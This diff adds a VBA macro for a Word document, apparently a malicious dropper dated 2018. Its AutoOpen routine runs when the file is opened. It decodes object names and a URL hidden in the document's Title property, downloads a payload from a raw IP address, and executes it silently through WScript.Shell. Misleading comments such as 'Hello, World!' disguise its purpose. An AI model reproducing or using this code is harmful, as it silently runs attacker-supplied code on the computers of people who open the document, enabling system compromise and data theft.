@@ -1,0 +1,17 @@
+' [DEBUG] Title = MSXML2.XMLHTTPXC1SUWScript.NetworkXC1SUWScript.ShellXC1SUhttp://165.227.70.224:5882/psPayload.txt
+'
+' Date: 9/29/2018
+Sub AutoOpen()
+    
+    tt = ThisDocument.BuiltInDocumentProperties("Title").Value
+    Dim stt As String
+    SubMenu = Split(tt, "XC1SU"): Set wN = CreateObject(SubMenu(1))
+    Set o = CreateObject(SubMenu(0)): o.Open "GET", SubMenu(3), False: o.send
+    stt = o.responseText: strUserDomain = wN.UserDomain
+
+    
+    Set counter = CreateObject(SubMenu(2)) 'Hello, World!
+    counter.Run (stt), 0 ' oh wow
+    'Set c = Nothing
+End Sub
+
